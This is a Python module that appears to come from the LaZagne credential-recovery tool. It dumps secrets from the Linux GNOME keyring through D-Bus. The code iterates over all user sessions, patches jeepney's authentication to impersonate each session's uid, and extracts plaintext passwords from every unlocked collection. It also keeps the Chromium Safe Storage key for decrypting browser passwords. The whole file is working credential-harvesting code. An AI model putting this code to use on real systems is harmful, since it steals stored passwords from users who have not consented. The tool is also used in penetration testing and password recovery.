#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lazagne.config.constant import constant
from lazagne.config.module_info import ModuleInfo
from lazagne.config import homes
from binascii import hexlify
import traceback

try:
    import jeepney.auth
# except ImportError:
except Exception:
    pass
else:
    # Thanks to @mitya57 for its Work around 
    def make_auth_external():
        hex_uid = hexlify(str(make_auth_external.uid).encode('ascii'))
        return b'AUTH EXTERNAL %b\r\n' % hex_uid
    jeepney.auth.make_auth_external = make_auth_external


class Libsecret(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'libsecret', 'wallet')

    def run(self):
        items = []
        visited = set()
        try:
            import dbus
            import secretstorage
            import datetime
        except ImportError as e:
            self.error('libsecret: {0}'.format(e))
            return []

        for uid, session in homes.sessions():
            try:
                # List bus connection names
                bus = dbus.bus.BusConnection(session)
                if 'org.freedesktop.secrets' not in [str(x) for x in bus.list_names()]:
                    continue
            except Exception:
                self.error(traceback.format_exc())
                continue

            collections = None
            try:
                # Python 2.7
                collections = list(secretstorage.collection.get_all_collections(bus))
            except Exception:
                pass

            if not collections:
                try:
                    # Python 3
                    from jeepney.integrate.blocking import connect_and_authenticate
                    make_auth_external.uid = uid
                    bus = connect_and_authenticate(session)
                    collections = secretstorage.get_all_collections(bus)
                except Exception:
                    self.error(traceback.format_exc())
                    continue

            for collection in collections:
                if collection.is_locked():
                    continue

                label = collection.get_label()
                if label in visited:
                    continue

                visited.add(label)

                try:
                    storage = collection.get_all_items()
                except Exception:
                    self.error(traceback.format_exc())
                    continue

                for item in storage:
                    values = {
                        'created': str(datetime.datetime.fromtimestamp(item.get_created())),
                        'modified': str(datetime.datetime.fromtimestamp(item.get_modified())),
                        'content-type': item.get_secret_content_type(),
                        'label': item.get_label(),
                        'Password': item.get_secret().decode('utf8'),
                        'collection': label,
                    }

                    # for k, v in item.get_attributes().iteritems():
                    #   values[unicode(k)] = unicode(v)
                    items.append(values)
                    if item.get_label() == 'Chromium Safe Storage':
                        constant.chrome_storage = item.get_secret()

            try:
                bus.flush()
                bus.close()
            except Exception:
                pass

        return items
